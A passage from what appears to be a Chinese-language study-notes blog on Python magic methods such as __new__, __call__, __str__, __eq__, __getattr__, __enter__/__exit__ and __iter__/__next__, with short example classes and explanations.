class="hljs-string">&quot;----- 函数内&quot;</span>)<br>    stu2 = Student(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">19</span>)<br>    <span class="hljs-built_in">print</span>(stu2.__dict__)<br><br><br>foo()<span class="hljs-comment"># foo函数执行结束，触发执行 __del__</span><br></code></pre></td></tr></table></figure><p>示例：执行程序，猜一猜打印结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__del__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;执行我啦&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------&gt;&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="5-2-new方法【重点】"><a href="#5-2-new方法【重点】" class="headerlink" title="5-2 new方法【重点】"></a>5-2 new方法【重点】</h2><ul><li>当类被调用实例化对象时第一个被处罚的函数，用来实例化并返回一个空对象</li><li><code>__new__</code>方法在init方法前执行，<code>__new__</code>函数会新建一个空对象，然后这个空对象会交给<code>__init__</code>函数初始化。这个方法结束的时候，把这个空对象return出去</li><li>这里说说实例化对象背后发生的三件事：<ul><li>1、<code>__new__</code>函数先会新建一个空对象，然后返回出去；给<code>__init__</code>函数</li><li>2、该空对象执行<code>__init__</code>函数，就初始化了对象的属性；</li><li>3、返回初始化完成后的对象，即实例化后的对象。</li></ul></li><li><code>__new__</code>魔法方法的一些应用场景：<ul><li><strong>实现单例模式</strong>（Singleton）:使用<code>__new__</code>方法来确保只有一个实例，并在需要时返回同一个实例。这个可以在多线程环境下确保只有一个全局实例，</li><li>定制不可变类型：如果你希望创建以恶搞不可变的自定义对象，可以通过在<code>__new__</code>方法中重写对象创建的逻辑来实现（不了解）</li><li>继承不可变类型：当继承python内置的不可变类型（如元组、字符串）时，你可以通过重写<code>__new__</code>方法来创建定制过程（不了解）</li><li>定制元类（Metaclass）：在元类中可以重写<code>__new__</code>方法，用于控制类的创建和实例化过程。（不了解，这个可以了解一下）</li><li>对象池管理：在某些情况下，你可能需要使用对象池来重用已有的对象实例，可以通过new方法来实现对象池的管理。（不了解，这个可以了解一下）</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 单例模式</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span>:<br>  _instance = <span class="hljs-literal">None</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls</span>):<br>    <span class="hljs-keyword">if</span> cls._instance <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>      cls._instance = <span class="hljs-built_in">super</span>().__new__(cls)<br>    <span class="hljs-keyword">return</span> cls._instance<br><br><br><span class="hljs-comment"># 创建 Singleton 类的实例</span><br>obj1 = Singleton()  <span class="hljs-comment"># 1622254056400</span><br>obj2 = Singleton()  <span class="hljs-comment"># 1622254056400</span><br><br><span class="hljs-built_in">print</span>(obj1 <span class="hljs-keyword">is</span> obj2)  <span class="hljs-comment"># 输出：True，因为 obj1 和 obj2 引用同一个实例</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 了解new 方法</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init:&quot;</span>, <span class="hljs-built_in">id</span>(self))  <span class="hljs-comment"># new: 2176264649120</span><br>    self.name = name<br>    self.age = age<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, *args, **kwargs</span>):<br>    obj = <span class="hljs-built_in">object</span>.__new__(cls)  <span class="hljs-comment"># init: 2176264649120</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;new:&quot;</span>, <span class="hljs-built_in">id</span>(obj))<br>    <span class="hljs-keyword">return</span> obj<br><br><br>stu1 = Student(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">19</span>)<br></code></pre></td></tr></table></figure><h2 id="5-3-call【重点】"><a href="#5-3-call【重点】" class="headerlink" title="5.3 call【重点】"></a>5.3 call【重点】</h2><ul><li>类中的<code>__call__</code>在对象被调用时出发。就是当对象加括号被调用时触发</li><li>对象或者变量，只有实现了<code>__call__</code>方法，才是可调用对象，才可以被执行，否则就会报错，<code> object is not callable</code></li><li>定义了<code>__call__</code>后，你实例化的对象可以像函数一样被调用，</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CallableClass</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, value</span>):<br>        self.value = value<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">self, x</span>):<br>        <span class="hljs-keyword">return</span> self.value * x<br><br><span class="hljs-comment"># 创建一个可调用的对象</span><br>callable_obj = CallableClass(<span class="hljs-number">5</span>)<br><br><span class="hljs-comment"># 调用对象，就像调用函数一样</span><br>result = callable_obj(<span class="hljs-number">10</span>)<br><span class="hljs-built_in">print</span>(result)  <span class="hljs-comment"># 输出：50</span><br><br></code></pre></td></tr></table></figure><p>总结就是，可以把类当方法直接调用</p><p>场景呢？</p><ul><li>当你希望某个对象能像函数一样调用且获得返回值时</li><li><code>__call__</code>方法并结合with语句和<code>__enter__</code>和<code>__exit__</code>方法。实现上下文管理</li><li><code>__call__</code>实现装饰器</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDecorator</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, func</span>):<br>        self.func = func <span class="hljs-comment"># 函数作为入参，传进来作为属性</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Before function is called&quot;</span>) <span class="hljs-comment"># 调用属性</span><br>        result = self.func(*args, **kwargs) <span class="hljs-comment"># 这是被装饰的方法</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;After function is called&quot;</span>)<br>        <span class="hljs-keyword">return</span> result<br><br><span class="hljs-meta">@MyDecorator </span><span class="hljs-comment"># @的本质就是在做 MyDecorator（my_function）</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_function</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> x + y<br><br>result = my_function(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Result:&quot;</span>, result)<br>Before function <span class="hljs-keyword">is</span> called<br>After function <span class="hljs-keyword">is</span> called<br>Result: <span class="hljs-number">8</span><br><br></code></pre></td></tr></table></figure><ul><li><strong>装饰器实现，两种方式</strong><ul><li><strong>第一个是常规的，闭包，嵌套函数</strong></li><li><strong>第二个就是定义带<code>__call__</code>的类。讲函数作为<code>__init__</code>入参传进来</strong></li></ul></li></ul><h2 id="5-4-str和repr"><a href="#5-4-str和repr" class="headerlink" title="5.4 str和repr"></a>5.4 str和repr</h2><ul><li><code>__str__</code>：当对象被访问打印时触发执行，他必须有一个字符串类型的返回值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Person(name=<span class="hljs-subst">&#123;self.name&#125;</span>, age=<span class="hljs-subst">&#123;self.age&#125;</span>)&quot;</span><br><br>person = Person(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">30</span>)<br><span class="hljs-built_in">print</span>(person)  <span class="hljs-comment"># Output: Person(name=Alice, age=30)</span><br><br>sut = Student(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>)<br><span class="hljs-built_in">print</span>(sut) <span class="hljs-comment"># 这个时候打印出来的内容，就是str方法return出来的内容</span><br></code></pre></td></tr></table></figure><p>好这个我知道了，那应用的场景呢？</p><ul><li><p>总之，<code>__str__</code> 魔法方法适用于需要自定义对象的可读性、用户友好性和调试信息的情况。它使你能够以更有意义的方式呈现对象，并提供有关对象状态和属性的重要信息。</p></li><li><p>repr，本质和srt一样，都是对象被打印时显示的内容，但是</p></li><li><p><strong>与<code>__str__</code>的区别：</strong> <code>__str__</code> 应该返回更友好、易读的字符串，而 <code>__repr__</code> 则应该返回更详细、可复制的字符串，通常包含足够的信息来重新创建对象。</p></li></ul><h2 id="5-5-比较系列-eq-nq-it"><a href="#5-5-比较系列-eq-nq-it" class="headerlink" title="5.5 比较系列 eq nq it"></a>5.5 比较系列 eq nq it</h2><p>两个对象是可以比较的，但是比较的结果可能不是我们预期的，此时可以重写比较系列的魔法方法，实现自定义比较逻辑</p><ul><li>eq<ul><li><code>__eq__</code> 方法是 Python 中的一个魔法方法，用于定义对象的相等性比较操作。当你在自定义类中实现了 <code>__eq__</code><br>方法时，你可以自定义对象之间的相等性判断规则</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(other, Person):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;eq被执行了&quot;</span>)  <span class="hljs-comment"># 只有当你在判断两个对象是否相等时，这个方法才会被触发</span><br>            <span class="hljs-keyword">return</span> self.name == other.name <span class="hljs-keyword">and</span> self.age == other.age<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br>person1 = Person(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">25</span>)<br>person2 = Person(<span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-number">30</span>)<br>person3 = Person(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">25</span>)<br><span class="hljs-comment"># print(person1.name)</span><br><span class="hljs-built_in">print</span>(person1 == person2)  <span class="hljs-comment"># False，根据 __eq__ 方法的定义，person1 和 person2 不相等</span><br><span class="hljs-built_in">print</span>(person1 == person3)  <span class="hljs-comment"># True，根据 __eq__ 方法的定义，person1 和 person3 相等</span><br><span class="hljs-comment"># eq被执行了</span><br><span class="hljs-comment"># False</span><br><span class="hljs-comment"># eq被执行了</span><br><span class="hljs-comment"># True</span><br></code></pre></td></tr></table></figure><ul><li>同样的道理，其他比较系列的放啊</li><li>nq，实现的是是够不相等的逻辑。如果没有实现，则默认是eq的结果取反。</li><li>该系列其他魔法方法：<code>__lt__、__gt__、__le__、__ge__</code>分别表示小于、大于、小于等于和大于等于。</li></ul><h2 id="5-6-attr系列-【了解】"><a href="#5-6-attr系列-【了解】" class="headerlink" title="5.6 attr系列 【了解】"></a>5.6 attr系列 【了解】</h2><ul><li>这个系列就和之前学习反射的时候是一样的道理</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        self.name = name<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattr__</span>(<span class="hljs-params">self, item</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;调用不存在的属性会触发我&#x27;</span>)<br>        <span class="hljs-keyword">return</span> self.__dict__.get(item) <span class="hljs-comment"># </span><br>        <span class="hljs-comment"># return self.item      # 不能使用，会造成递归。</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__setattr__</span>(<span class="hljs-params">self, key, value</span>): <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;设置修改对象属性时触发我&#x27;</span>) <span class="hljs-comment"># 这个在实例化对象的时候会被触发，可以有其他用处</span><br>        self.__dict__[key] = value<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__delattr__</span>(<span class="hljs-params">self, item</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;删除对象属性时触发我&#x27;</span>)<br>        self.__dict__.pop(item)<br><br><br>p = Person(<span class="hljs-string">&#x27;jack&#x27;</span>)      <span class="hljs-comment"># 触发__setattr__</span><br>p.name = <span class="hljs-string">&#x27;mack&#x27;</span>         <span class="hljs-comment"># 触发__setattr__</span><br><span class="hljs-built_in">print</span>(p.age)            <span class="hljs-comment"># 触发__getattr__</span><br>p.age = <span class="hljs-number">18</span>              <span class="hljs-comment"># 触发__setattr__</span><br><span class="hljs-built_in">print</span>(p.age)            <br><span class="hljs-keyword">del</span> p.age               <span class="hljs-comment"># __delattr__</span><br></code></pre></td></tr></table></figure><ul><li>示例二，让字典，实现像对象一样的点操作</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDict</span>(<span class="hljs-title class_ inherited__">dict</span>):<br>    abc = <span class="hljs-string">&quot;abc&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattr__</span>(<span class="hljs-params">self, item</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;字典对象通过点访问不存在的属性时触发&quot;</span>)<br>        <span class="hljs-keyword">return</span> self.get(item)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__setattr__</span>(<span class="hljs-params">self, key, value</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(value, <span class="hljs-built_in">str</span>):<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;值必须是字符串类型&#x27;</span>)<br>        self[key] = value<br><br><br>d = MyDict(&#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;jack&#x27;</span>&#125;)<br><span class="hljs-built_in">print</span>(d.name)               <span class="hljs-comment"># 触发 __getattr__</span><br><span class="hljs-built_in">print</span>(d.abc)                <span class="hljs-comment"># 没有触发 __getattr__</span><br></code></pre></td></tr></table></figure><h2 id="5-7-item系列-，和attr一样用【重点】"><a href="#5-7-item系列-，和attr一样用【重点】" class="headerlink" title="5.7 item系列 ，和attr一样用【重点】"></a>5.7 item系列 ，和attr一样用【重点】</h2><p>实现普通对象像字典一样通过 [ ] 操作 和attr一样理解</p><p>item:项目</p><p>attr: attribute： 属性的英文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        self.name = name<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__setitem__</span>(<span class="hljs-params">self, key, value</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[]设置值时触发&quot;</span>)<br>        <span class="hljs-built_in">setattr</span>(self, key, value)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, item</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[]取值时触发&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(self, item)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__delitem__</span>(<span class="hljs-params">self, key</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;del p[key]时触发&quot;</span>, key)<br><br><br>p = Person(<span class="hljs-string">&#x27;jack&#x27;</span>)<br>p[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;mack&#x27;</span> <span class="hljs-comment"># 需要__setitem__才可以</span><br><span class="hljs-built_in">print</span>(p[<span class="hljs-string">&#x27;name&#x27;</span>])             <span class="hljs-comment"># 需要__getitem__才可以</span><br><span class="hljs-built_in">print</span>(p.__dict__)<br><br><span class="hljs-keyword">del</span> p[<span class="hljs-string">&quot;name&quot;</span>]<span class="hljs-comment"># 需要__delitem__才可以</span><br></code></pre></td></tr></table></figure><h2 id="5-8-enter和exit【了解】"><a href="#5-8-enter和exit【了解】" class="headerlink" title="5.8 enter和exit【了解】"></a>5.8 enter和exit【了解】</h2><ul><li><code>上下文管理器</code>：<ul><li>执行代码块前后的操作，</li><li>文件也是代码块</li></ul></li><li>with ：顺着<ul><li>顺着上下文管理器</li></ul></li><li>with open(file , mode操作模式)  mode就是r读取和w写入的模式选择<ul><li>这里的with open中的open( )函数所返回出来的对象就是一个上下文管理器，这个对象实现了enter方法和exit方法 用于对文件的自动打开和关闭，</li><li>如果没有open，那我们的代码应该是怎么写的？<ul><li>就像数据库一样</li><li>file &#x3D; open ( ‘file’ , mode )</li><li>file.write(“hello,world”)</li><li>file.close( )</li><li>但是这样写不好看很麻烦，with open 就自动帮我们实现了打开和写入和关闭的操作</li></ul></li></ul></li><li>好，说到这里，就能理解enter和exit了</li><li>这个代码里的MyOpen就是我们的自己定义的上下文管理器，这个类所返回出来的对象就是一个上下文管理器，实现了enter和exit方法打开和关闭</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyOpen</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, file_name: <span class="hljs-built_in">str</span>, mode=<span class="hljs-string">&quot;r&quot;</span></span>):<br>        self.file = <span class="hljs-built_in">open</span>(file_name, mode)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__enter__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;进入with语句块时触发&quot;</span>)<br>        <span class="hljs-keyword">return</span> self.file        <span class="hljs-comment"># 返回值赋值给 as后面的接收值</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__exit__</span>(<span class="hljs-params">self, exc_type, exc_val, exc_tb</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;退出with语句块时触发，不论with语句块内是够有异常报错，__exit__都会被执行&quot;</span>)<br>        self.file.close()<br><br><br>        <br><span class="hljs-keyword">with</span> MyOpen(<span class="hljs-string">&quot;text.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&quot;hello world&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="5-9-iter和next【重点】"><a href="#5-9-iter和next【重点】" class="headerlink" title="5.9 iter和next【重点】"></a>5.9 iter和next【重点】</h2><p>见名知意，这两个方法是实现迭代器功能的，比如实现一个range</p><p>这样我们就知道了range原理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 普通range</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><ul><li>通过自己定义这两个魔法方法实现自己的range</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRange</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,total: <span class="hljs-built_in">int</span>,step: <span class="hljs-built_in">int</span>=<span class="hljs-number">1</span></span>):<br>        self.count = <span class="hljs-number">0</span>  <span class="hljs-comment"># 这里都是定义属性</span><br>        self.total = total<br>        self.step = step <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__iter__</span>(<span class="hljs-params">self</span>):  <span class="hljs-comment"># </span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1111&quot;</span>)<br>        <span class="hljs-keyword">return</span> self  <span class="hljs-comment"># for循环第一个进入时执行一次，需要返回一个实现了__next__的迭代器对象</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__next__</span>(<span class="hljs-params">self</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        self.count += self.step <span class="hljs-comment"># 没次运行加1或者自定义的数</span><br>        <span class="hljs-keyword">if</span> self.count == self.total:<br>            reise StopIteration <span class="hljs-comment"># 如果count计数等于total总数时引发迭代异常，不是抛出，这个迭代异常表示迭代结束</span><br>        <span class="hljs-keyword">return</span> self.count <br>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> MyRange(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><ul><li>总结一下，</li><li>iter 当一个类，定义了iter魔法方法，这个类的实例，就被认为是可迭代的（iterable)<ul><li>iter方法应返回一个迭代器对象，可以是self，也可以是另一个实现了next方法的对象</li></ul></li><li>next 方法：这个方法用于获取迭代中的下一个值。<ul><li>如果没有更多的值可迭代，应该要引发StopIteration异常，表示迭代结束</li></ul></li></ul><p>在 Python 中，迭代器（Iterator）和生成器（Generator）是用于处理可迭代对象的重要概念。它们提供了一种有效的方式来逐个访问和处理大型数据集或无限序列，同时节省内存和提高性能。</p><p><strong>迭代器（Iterator）</strong>是一个实现了迭代协议的对象。它具有两个核心方法：</p><ol><li><code>__iter__()</code> 方法：返回迭代器对象自身。用于支持迭代协议，使迭代器可以在 <code>for</code> 循环等上下文中使用。</li><li><code>__next__()</code> 方法：返回迭代器的下一个元素。如果没有更多元素可供迭代，抛出 <code>StopIteration</code> 异常。</li></ol><p>迭代器的工作原理是通过迭代协议来逐个返回元素，只在需要时生成和提供数据，从而避免一次性加载和处理整个数据集或序列。</p><p><strong>生成器（Generator）</strong>是一种特殊类型的迭代器，可以使用函数和 <code>yield</code> 语句来创建。生成器函数在被调用时返回一个生成器对象，它可以被迭代，每次迭代都会执行函数体中的代码，直到遇到 <code>yield</code> 语句。</p><p>生成器的优点在于它们的定义更简洁，并且它们以惰性的方式生成数据，只在需要时才生成和提供数据。这使得生成器非常适用于处理大型数据集或无限序列，因为它们可以逐步生成数据，而不会一次性占用大量内存。</p><p>以下是一个简单的示例，展示了迭代器和生成器的使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 迭代器示例</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyIterator</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, data</span>):<br>        self.data = data<br>        self.index = <span class="hljs-number">0</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__iter__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__next__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> self.index &gt;= <span class="hljs-built_in">len</span>(self.data):<br>            <span class="hljs-keyword">raise</span> StopIteration<br>        value = self.data[self.index]<br>        self.index += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> value<br><br><span class="hljs-comment"># 